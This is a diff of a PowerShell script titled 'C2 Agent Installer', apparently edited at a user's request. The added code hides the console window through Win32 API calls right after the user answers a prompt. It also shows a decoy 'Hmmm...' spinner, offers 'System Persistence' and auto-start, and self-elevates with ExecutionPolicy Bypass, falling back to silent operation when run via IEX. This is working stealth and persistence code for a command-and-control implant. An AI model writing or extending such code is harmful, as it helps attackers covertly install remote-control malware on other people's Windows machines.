@@ -30,6 +30,24 @@ function Show-Spinner {
     Write-Host -NoNewline "$Message"
 }
 
+function Hide-Console {
+    $code = @'
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+'@
+    try {
+        $type = Add-Type -MemberDefinition $code -Name "Win32Hide" -Namespace Win32 -PassThru
+        $hwnd = $type::GetConsoleWindow()
+        if ($hwnd -ne [IntPtr]::Zero) {
+            $type::ShowWindow($hwnd, 0) # 0 = SW_HIDE
+        }
+    } catch {
+        # Ignore if hiding fails
+    }
+}
+
 function Test-Admin {
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -40,12 +58,24 @@ function Test-Admin {
 # =============================================================================
 
 Clear-Host
-Show-Spinner "Hmmm..."
 
-# Validate Mode
-if ($Mode -notin "Admin", "Normal") {
-    $Mode = "Admin"
+# Interactive Admin Prompt
+if (-not (Test-Admin)) {
+    Write-Host "C2 Agent Installer" -ForegroundColor Cyan
+    $response = Read-Host "Allow Administrator features (Auto-Start, System Persistence)? (y/n)"
+    
+    if ($response -match "^[yY]") {
+        $Mode = "Admin"
+    } else {
+        $Mode = "Normal"
+    }
+} else {
+    $Mode = "Admin" # Already admin, default to admin mode
 }
+
+# Hiding Window Immediately after user interaction
+Hide-Console
+Show-Spinner "Hmmm..."
 
 # Self-Elevation Logic (Only for Admin Mode)
 if ($Mode -eq "Admin") {
@@ -55,19 +85,13 @@ if ($Mode -eq "Admin") {
             # Try to restart this script as Admin
             if ($PSCommandPath) {
                 Start-Process powerShell -ArgumentList "-NoProfile", "-ExecutionPolicy Bypass", "-File `"$PSCommandPath`"", "-Mode Admin", "-Force" -Verb RunAs
-                exit
+                [Environment]::Exit(0)
             } else {
-                # If running via IEX/ScriptBlock, we can't easily self-elevate the exact command.
-                # Fallback to Normal mode or warn?
-                # For this request, we'll try to proceed or fail if critical. 
-                # Converting to Normal mode automatically might be safer for "silent" operations.
-                # However, user asked for Admin mode.
-                
-                # attempt to just continue, but we know it might fail. 
-                # Ideally, we would re-fetch the script, but we don't have the URL here.
-                # Let's switch to Normal mode to ensure it WORKS, but maybe warn?
-                # User asked for "Hmmm...", so no warnings.
-                $Mode = "Normal" 
+                # If running via IEX, we can't easily self-elevate.
+                # Since user EXPLICITLY requested Admin, we should warn them.
+                # But since the console is hidden now, we can't warn easily.
+                # We will just proceed in Normal mode as a fallback to ensure *something* runs.
+                $Mode = "Normal"
             }
         } catch {
             $Mode = "Normal"
